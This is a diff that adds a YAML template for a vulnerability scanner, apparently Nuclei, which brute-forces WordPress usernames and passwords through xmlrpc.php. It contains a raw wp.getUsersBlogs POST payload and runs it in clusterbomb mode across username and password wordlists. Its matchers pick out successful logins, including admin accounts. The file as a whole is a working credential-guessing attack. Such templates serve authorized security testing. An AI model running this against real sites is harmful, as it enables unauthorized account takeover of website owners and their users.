@@ -1,0 +1,53 @@
+id: wordpress-xmlrpc-brute-force
+
+info:
+  name: Wordpress XMLRPC.php username and password Bruteforcer
+  author: Exid
+  severity: high
+  description: This template bruteforces username and passwords through xmlrpc.php being available.
+  reference:
+    - https://bugdasht.ir/reports/3c6841c0-ae4c-11eb-a510-517171a9198c
+    - https://www.acunetix.com/vulnerabilities/web/wordpress-xml-rpc-authentication-brute-force/
+  metadata:
+    max-request: 276
+  tags: wordpress,php,xmlrpc,brute-force
+
+http:
+  - raw:
+      - |
+        POST /xmlrpc.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 235
+
+        <?xml version="1.0" encoding="UTF-8"?>
+         <methodCall>
+           <methodName>wp.getUsersBlogs</methodName>
+           <params>
+             <param>
+               <value>{{username}}</value>
+             </param>
+               <param>
+             <value>{{password}}</value>
+               </param>
+           </params>
+         </methodCall>
+
+    attack: clusterbomb
+    payloads:
+      username: helpers/wordlists/wp-users.txt
+      password: helpers/wordlists/wp-passwords.txt
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - 'url'
+          - 'xmlrpc'
+          - 'isAdmin'
+        condition: and
+# digest: 490a0046304402207f26aab2d656d615c6972106a38550f20f88b1733d6922d1b4e8e1c747c170e602203e2c12dcae0766e613ab701da1a0d7e1b60a2b455797a5581a76e2794356ca30:922c64590222798bb761d5b6d8e72950
